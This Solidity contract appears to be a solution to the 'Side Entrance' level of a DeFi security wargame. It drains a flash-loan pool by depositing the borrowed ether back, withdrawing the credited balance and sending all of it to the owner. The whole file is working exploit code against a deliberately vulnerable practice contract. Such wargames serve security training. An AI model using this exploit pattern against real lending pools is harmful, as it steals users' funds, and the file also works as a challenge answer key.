// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

/**
 * @title StealSideEntrance
 * @author Louis Law
 */
contract StealSideEntrance is IFlashLoanEtherReceiver {
    address private owner;
    SideEntranceLenderPool private pool;

    constructor(address _owner, SideEntranceLenderPool _pool) {
        owner = _owner;
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function executeFlashLoan() external payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    // https://www.educative.io/answers/how-to-receive-ethers-inside-a-smart-contract
    // The receive() function is needed to handle SafeTransferLib.safeTransferETH().
    receive() external payable {
        // option 1
        // (bool success, ) = payable(owner).call{value: address(this).balance}(
        //     ""
        // );
        // require(success, "transfer failed.");

        // option 2
        // SafeTransferLib.safeTransferETH(address(owner), msg.value);

        // option 3
        SafeTransferLib.safeTransferETH(address(owner), address(this).balance);
    }
}
